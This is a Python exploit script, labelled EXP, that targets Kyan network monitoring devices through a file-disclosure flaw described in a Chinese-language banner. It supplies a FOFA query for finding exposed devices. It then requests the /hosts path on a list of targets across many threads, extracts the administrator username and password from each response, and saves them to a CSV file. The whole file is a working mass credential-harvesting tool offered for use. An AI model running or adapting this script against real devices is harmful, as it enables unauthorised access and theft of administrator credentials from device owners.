#!/usr/bin/python3.7
# -*- coding: utf-8 -*-
# @Author  : Cr4y0n
# @Software: PyCharm
# @Time    : 2021/05/11

import os
import csv
import time
import requests
from threading import Lock
from concurrent.futures import ThreadPoolExecutor
from argparse import ArgumentParser

requests.packages.urllib3.disable_warnings()

class POC:
    def __init__(self):
        self.banner()
        self.args = self.parseArgs()
        self.init()
        self.urlList = self.loadURL()  # 所有目标
        self.multiRun()
        self.start = time.time()

    def banner(self):
        logo = r"""
     _   __                  _   _                     ______              _                _    
    | | / /                 | \ | |                    | ___ \            | |              | |   
    | |/ / _   _  __ _ _ __ |  \| | __ _ _ __ ___   ___| |_/ /_ _ ___ ___ | |     ___  __ _| | __
    |    \| | | |/ _` | '_ \| . ` |/ _` | '_ ` _ \ / _ \  __/ _` / __/ __|| |    / _ \/ _` | |/ /
    | |\  \ |_| | (_| | | | | |\  | (_| | | | | | |  __/ | | (_| \__ \__ \| |___|  __/ (_| |   < 
    \_| \_/\__, |\__,_|_| |_\_| \_/\__,_|_| |_| |_|\___\_|  \__,_|___/___/\_____/\___|\__,_|_|\_\   EXP
            __/ |                                                                                
           |___/                                                                         Author: Cr4y0n
        """
        msg = """
==================================================
| 漏洞名称 | Kyan网络监控设备-账号密码泄漏
| 漏洞时间 | 2021-04
| 影响版本 | <=2.7 ?
| 漏洞文件 | hosts
| 默认路径 | /hosts
| 脚本功能 | 利用账号密码泄露网站管理员密码
| 读取文件 | /hosts
| FOFA语句 | title="platform - Login"
==================================================
        """
        print("\033[91m" + logo + "\033[0m")
        print(msg)

    def init(self):
        print("thread:", self.args.thread)
        print("timeout:", self.args.timeout)
        msg = ""
        if os.path.isfile(self.args.file):
            msg += "Load url file successfully\n"
        else:
            msg += f"\033[31mLoad url file {self.args.file} failed\033[0m\n"
        print(msg)
        if "failed" in msg:
            print("Init failed, Please check the environment.\n")
            os._exit(0)
        print("Init successfully")

    def parseArgs(self):
        date = time.strftime("%Y-%m-%d_%H-%M-%S", time.localtime())
        parser = ArgumentParser()
        parser.add_argument("-f", "--file", required=False, type=str, default=f"./url.txt", help=f"The url file, default is ./url.txt")
        parser.add_argument("-t", "--thread", required=False, type=int, default=32, help=f"Number of thread, default is 32")
        parser.add_argument("-T", "--timeout", required=False, type=int, default=3,  help="request timeout(default 3)")
        parser.add_argument("-o", "--output", required=False, type=str, default=date,  help="Vuln url output file, default is {date}.txt")
        return parser.parse_args()

    # 验证漏洞并导出密码
    def verify(self, url):
        repData = self.readFile(url, "/hosts")
        if "UserName" in repData:
            data = list(repData.strip().split("\n"))
            username = data[0][9:]
            password = data[1][9:]
            msg = f"\033[32m[+] [ Vuln ]  {url:<30}  {username:<10}  {password}\033[0m"
            self.lock.acquire()
            try:
                self.findCount += 1
                self.vulnRULList.append([f"{url}", username, password])
                print(msg)
            finally:
                self.lock.release()
        # elif "Conn" == repData:
        #     msg = f"\033[31m[!] [ Conn ]  {url}\033[0m"
        # else:
        #     msg = f"[-] [ Safe ]  {url}"
        # self.lock.acquire()
        # try:
        #     print(msg)
        # finally:
        #     self.lock.release()

    # 利用漏洞读取文件
    def readFile(self, url, filename):
        reqURL = url + filename
        try:
            rep = requests.get(url=reqURL, timeout=self.args.timeout, verify=False)
            fileData = rep.text
            return fileData
        except:
            return "Conn"

    # 加载url地址
    def loadURL(self):
        urlList = []
        with open(self.args.file, encoding="utf8") as f:
            for line in f.readlines():
                line = line.strip()
                if "https://" in line:
                    line = line.replace("https://", "http://")
                if "http://" not in line:
                    line = f"http://{line}"
                urlList.append(line)
        return urlList

    # 多线程运行
    def multiRun(self):
        self.findCount = 0
        self.vulnRULList = []
        self.lock = Lock()
        executor = ThreadPoolExecutor(max_workers=self.args.thread)
        executor.map(self.verify, self.urlList)

    # 输出到文件
    def output(self):
        self.outputFile = f"./output/passExport_{self.args.output}.csv"
        if not os.path.isdir(r"./output"):
            os.mkdir(r"./output")
        with open(self.outputFile, "a", encoding="gbk", newline="") as f:
            csvWrite = csv.writer(f)
            csvWrite.writerow(["URL","UserName", "Password"])
            for result in self.vulnRULList:
                csvWrite.writerow(result)

    def __del__(self):
        try:
            print("\nattemptCount：\033[31m%d\033[0m   findCount：\033[32m%d\033[0m" % (len(self.urlList), self.findCount))
            self.end = time.time()
            print("Time Spent: %.2f" % (self.end - self.start))
            self.output()
            print("-" * 20, f"\nThe result has been saved in {self.outputFile}\n")
        except:
            pass

if __name__ == "__main__":
    POC()


